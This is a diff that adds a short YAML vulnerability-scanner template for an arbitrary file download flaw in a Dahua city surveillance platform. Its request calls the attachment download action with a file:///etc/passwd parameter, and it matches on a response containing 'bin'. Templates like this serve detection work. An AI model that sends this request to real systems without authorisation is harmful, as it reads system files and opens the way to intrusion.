@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 大华城市安防监控系统平台任意文件下载漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+  headers:
+response1:
+  headers:
+  body: bin
+  code: 200
+requests2:
+response2:
